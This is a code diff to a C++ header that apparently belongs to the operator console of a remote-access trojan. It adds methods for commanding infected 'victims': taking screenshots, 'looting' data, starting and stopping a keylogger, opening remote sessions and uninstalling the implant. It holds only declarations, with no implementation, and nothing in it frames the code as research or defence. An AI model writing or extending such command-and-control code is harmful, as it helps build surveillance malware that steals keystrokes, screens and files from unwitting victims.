@@ -70,4 +70,36 @@ public:
     [[nodiscard]] bool login() noexcept;
 
     [[nodiscard]] bool fetchVictims() noexcept;
+
+    [[nodiscard]] bool sendTimeoutCommand(const UUID& client_id, int timeout);
+
+    [[nodiscard]] bool sendOpenSessionCommand(const UUID& client_id, int64_t port);
+
+    [[nodiscard]] bool sendCloseSessionCommand(const UUID& client_id);
+
+    [[nodiscard]] bool sendScreenshotCommand(const UUID& client_id);
+
+    [[nodiscard]] bool sendLootCommand(const UUID& client_id);
+
+    [[nodiscard]] bool sendStartKeyloggerCommand(const UUID& client_id);
+
+    [[nodiscard]] bool sendStopKeyloggerCommand(const UUID& client_id);
+
+    [[nodiscard]] bool sendUninstallCommand(const UUID& client_id);
+
+    [[nodiscard]] bool sendTimeoutCommand(int64_t client_id, int timeout);
+
+    [[nodiscard]] bool sendOpenSessionCommand(int64_t client_id, int64_t port);
+
+    [[nodiscard]] bool sendCloseSessionCommand(int64_t client_id);
+
+    [[nodiscard]] bool sendScreenshotCommand(int64_t client_id);
+
+    [[nodiscard]] bool sendLootCommand(int64_t client_id);
+
+    [[nodiscard]] bool sendStartKeyloggerCommand(int64_t client_id);
+
+    [[nodiscard]] bool sendStopKeyloggerCommand(int64_t client_id);
+
+    [[nodiscard]] bool sendUninstallCommand(int64_t client_id);
 };
